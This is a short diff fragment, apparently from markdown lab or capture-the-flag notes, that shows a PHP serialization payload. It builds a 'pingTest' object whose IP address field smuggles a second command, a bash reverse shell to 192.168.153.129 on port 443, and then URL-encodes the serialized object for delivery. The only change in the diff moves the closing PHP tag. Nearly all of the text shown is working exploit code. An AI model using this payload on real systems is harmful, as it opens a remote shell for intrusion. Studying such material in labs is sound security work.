@@ -106,7 +106,8 @@ class pingTest {
 public $ipAddress = "; bash -c 'bash -i >& /dev/tcp/192.168.153.129/443 0>&1'"; 
 public $isValid = True; 
 public $output = ""; } 
-echo urlencode(serialize(new pingTest)); ?>
+echo urlencode(serialize(new pingTest)); 
+?>
 ```
 
 ![[Pasted image 20230801115652.png]]
